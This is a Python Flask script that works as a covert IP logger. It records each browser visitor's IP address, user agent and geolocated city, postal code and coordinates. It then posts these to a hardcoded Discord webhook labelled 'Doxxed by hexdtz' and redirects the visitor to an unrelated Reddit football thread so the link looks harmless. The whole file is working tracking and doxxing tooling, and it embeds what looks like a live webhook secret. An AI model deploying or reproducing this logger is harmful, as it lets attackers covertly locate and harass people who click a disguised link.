from flask import Flask, request, redirect
import requests
import json
from datetime import datetime

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

logged_ips = set()

def get_real_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    ip = xff.split(",")[0].strip() if xff else request.remote_addr
    return ip

def get_visitor_info(ip, user_agent):
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
    except Exception:
        details = {}

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "xx").lower(),
        "region": details.get("region", ""),
        "city": details.get("city", ""),
        "zip": details.get("postal", ""),
        "lat": details.get("latitude", 0),
        "lon": details.get("longitude", 0),
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
    ip_city = f"{info['ip']} ({info['city'] or 'Unknown City'})"

    embed = {
        "username": "Doxxed by hexdtz",
        "avatar_url": flag_url,
        "embeds": [{
            "title": f"🌍 Visitor From {info['country']}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": ip_city, "inline": True},
                {"name": "User Agent", "value": info["user_agent"], "inline": False},
                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
                {"name": "Region | City | Zip", "value": f"{info['region']} | {info['city']} | {info['zip']}", "inline": True},
                {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
            ],
            "footer": {
                "text": f"Time (GMT): {info['date']} {info['time']}",
                "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
            }
        }]
    }

    headers = {"Content-Type": "application/json"}
    requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    if ip not in logged_ips and "Mozilla" in user_agent:
        logged_ips.add(ip)
        info = get_visitor_info(ip, user_agent)
        send_to_discord(info)

    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
